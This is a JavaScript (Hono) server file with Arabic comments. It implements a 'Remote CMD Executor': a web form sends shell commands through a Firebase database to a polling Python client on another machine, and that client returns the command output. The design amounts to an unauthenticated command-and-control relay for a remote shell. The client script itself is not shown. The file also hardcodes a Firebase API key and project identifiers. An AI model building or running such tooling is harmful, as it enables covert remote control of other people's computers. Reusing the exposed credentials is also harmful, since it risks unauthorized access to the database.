import { Hono } from 'hono';
import { initializeApp } from 'firebase/app';
import { getDatabase, ref, set, get, remove } from 'firebase/database';

const app = new Hono();

// بيانات الاتصال بقاعدة بيانات Firebase
const firebaseConfig = {
  apiKey: "AIzaSyC07Gs8L5vxlUmC561PKbxthewA1mrxYDk",
  authDomain: "zylos-test.firebaseapp.com",
  databaseURL: "https://zylos-test-default-rtdb.firebaseio.com",
  projectId: "zylos-test",
  storageBucket: "zylos-test.firebasestorage.app",
  messagingSenderId: "553027007913",
  appId: "1:553027007913:web:2daa37ddf2b2c7c20b00b8"
};

const firebaseApp = initializeApp(firebaseConfig);
const database = getDatabase(firebaseApp);

// الصفحة الرئيسية (الواجهة الأمامية)
app.get('/', (c) => {
  return c.html(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Remote CMD Executor</title>
      <style>
        body { font-family: sans-serif; background-color: #1e1e1e; color: #d4d4d4; }
        .container { max-width: 800px; margin: 50px auto; padding: 20px; background-color: #252526; border-radius: 8px; }
        input { width: calc(100% - 100px); padding: 10px; border: 1px solid #3c3c3c; background-color: #3c3c3c; color: #d4d4d4; }
        button { width: 90px; padding: 10px; cursor: pointer; background-color: #0e639c; color: white; border: none; }
        #result { white-space: pre-wrap; background-color: #1e1e1e; padding: 15px; margin-top: 20px; border: 1px solid #3c3c3c; min-height: 100px; font-family: monospace; color: #ce9178;}
        #status { color: #f44336; }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>Execute CMD Command</h1>
        <form id="cmd-form">
          <input type="text" id="cmd-input" placeholder="Enter command (e.g., dir)" required />
          <button type="submit">Execute</button>
        </form>
        <p id="status">Ready for command...</p>
        <h3>Result:</h3>
        <pre id="result">...</pre>
      </div>
      <script>
        const form = document.getElementById('cmd-form');
        const input = document.getElementById('cmd-input');
        const resultDiv = document.getElementById('result');
        const statusDiv = document.getElementById('status');
        let pollingInterval;

        form.addEventListener('submit', async (e) => {
          e.preventDefault();
          const command = input.value;
          if (!command) return;

          statusDiv.textContent = 'Sending command...';
          resultDiv.textContent = '...';
          
          try {
            const response = await fetch('/api/command', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ cmd: command }),
            });

            if (!response.ok) {
              const errorData = await response.json();
              throw new Error(errorData.error || 'Failed to send command');
            }
            
            input.value = '';
            statusDiv.textContent = 'Command sent successfully. Waiting for result...';

            if (pollingInterval) clearInterval(pollingInterval);
            pollingInterval = setInterval(fetchResult, 3000);

          } catch (error) {
            statusDiv.textContent = 'Error: ' + error.message;
          }
        });

        async function fetchResult() {
          try {
            const response = await fetch('/api/result');
            if (!response.ok) return; // لا تفعل شيئاً إذا كان هناك خطأ
            const data = await response.json();
            if (data && data.output) {
              resultDiv.textContent = data.output;
              statusDiv.textContent = 'Result received. Ready for new command.';
              clearInterval(pollingInterval);
            }
          } catch(error){
              console.error("Error fetching result:", error);
          }
        }
      </script>
    </body>
    </html>
  `);
});

// Endpoint لإرسال الأمر من واجهة الويب إلى Firebase
app.post('/api/command', async (c) => {
  console.log("Received request on /api/command");
  try {
    const { cmd } = await c.req.json();
    if (!cmd) {
      return c.json({ success: false, error: 'Command is required' }, 400);
    }
    console.log(`Command to execute: ${cmd}`);

    // كتابة الأمر في Firebase
    await set(ref(database, 'command/'), { cmd: cmd });
    console.log("Command successfully written to Firebase.");
    
    // مسح النتيجة القديمة لضمان عدم عرضها مرة أخرى
    await set(ref(database, 'result/'), null);
    
    return c.json({ success: true, message: 'Command sent successfully' });
  } catch (error) {
    console.error("Error in /api/command:", error);
    return c.json({ success: false, error: 'Internal Server Error: Failed to send command.' }, 500);
  }
});

// Endpoint لسكربت البايثون لسحب الأوامر
app.get('/api/get-command', async (c) => {
  console.log("Python client is polling /api/get-command");
  try {
    const commandRef = ref(database, 'command/');
    const snapshot = await get(commandRef);
    if (snapshot.exists()) {
      const data = snapshot.val();
      console.log("Found a command, sending to Python client:", data.cmd);
      await remove(commandRef); // حذف الأمر بعد قراءته
      return c.json(data);
    }
    // لا يوجد أمر جديد، هذا طبيعي
    return c.json({});
  } catch (error) {
    console.error("Error in /api/get-command:", error);
    return c.json({ success: false, error: 'Internal Server Error: Failed to get command.' }, 500);
  }
});

// Endpoint لسكربت البايثون لإرسال النتائج
app.post('/api/post-result', async (c) => {
  console.log("Received result from Python client on /api/post-result");
  try {
    const { output } = await c.req.json();
    await set(ref(database, 'result/'), { output: output });
    console.log("Result successfully written to Firebase.");
    return c.json({ success: true, message: 'Result posted' });
  } catch (error) {
    console.error("Error in /api/post-result:", error);
    return c.json({ success: false, error: 'Internal Server Error: Failed to post result.' }, 500);
  }
});

// Endpoint للواجهة الأمامية لجلب النتيجة
app.get('/api/result', async (c) => {
    try {
      const snapshot = await get(ref(database, 'result/'));
      if (snapshot.exists()) {
        const data = snapshot.val();
        return c.json({ output: data.output });
      }
      return c.json({ output: null });
    } catch (error) {
      console.error("Error in /api/result:", error);
      return c.json({ success: false, error: 'Failed to fetch result' }, 500);
    }
  });

export default app;